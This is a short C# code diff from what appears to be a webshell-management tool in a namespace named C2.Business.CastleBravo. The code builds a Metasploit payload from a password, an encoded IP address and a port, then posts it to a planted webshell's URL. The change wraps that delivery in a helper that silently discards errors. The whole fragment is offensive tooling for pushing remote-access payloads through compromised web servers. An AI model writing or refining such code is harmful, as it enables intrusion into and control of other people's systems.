@@ -37,10 +37,20 @@ namespace C2.Business.CastleBravo.WebShellTool
             string encodeIP = ST.EncodeBase64(mc.Groups[1].Value);
             string port = mc.Groups[3].Value;
             string payload = string.Format(Global.MSFPayload, task.Password, port, encodeIP);
-            Task<string> t = Task.Run(() =>
-            WebClientEx.Post(NetUtil.FormatUrl(task.Url), payload, 900000, proxy));
+            Task<string> t = Task.Run(() => PostPayload(payload));
             return base.OnOKButtonClick();
         }
-
+        private string PostPayload(string payload)
+        {
+            try 
+            { 
+                return WebClientEx.Post(NetUtil.FormatUrl(task.Url), payload, 900000, proxy);
+            }
+            catch
+            {
+                return string.Empty;
+            }
+            
+        }
     }
 }
